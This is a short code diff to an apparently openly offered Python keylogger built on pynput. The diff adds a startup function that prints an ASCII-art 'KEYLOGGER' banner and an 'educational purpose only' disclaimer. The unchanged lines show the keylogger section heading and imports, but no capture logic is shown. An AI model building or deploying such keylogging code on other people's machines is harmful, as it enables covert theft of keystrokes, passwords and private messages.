@@ -4,6 +4,27 @@ import threading
 from pynput.keyboard import Key, Listener
 import time
 
+
+#Banner
+def print_banner():
+    banner = """
+      
+      
+ ___   _  _______  __   __  ___      _______  _______  _______  _______  ______   
+|   | | ||       ||  | |  ||   |    |       ||       ||       ||       ||    _ |  
+|   |_| ||    ___||  |_|  ||   |    |   _   ||    ___||    ___||    ___||   | ||  
+|      _||   |___ |       ||   |    |  | |  ||   | __ |   | __ |   |___ |   |_||_ 
+|     |_ |    ___||_     _||   |___ |  |_|  ||   ||  ||   ||  ||    ___||    __  |
+|    _  ||   |___   |   |  |       ||       ||   |_| ||   |_| ||   |___ |   |  | |
+|___| |_||_______|  |___|  |_______||_______||_______||_______||_______||___|  |_|
+Note:"It is just for educational purpose only!"
+                                             
+    """
+    print(banner)
+    
+print_banner()
+
+
 # Keylogger part
 keys = []
 
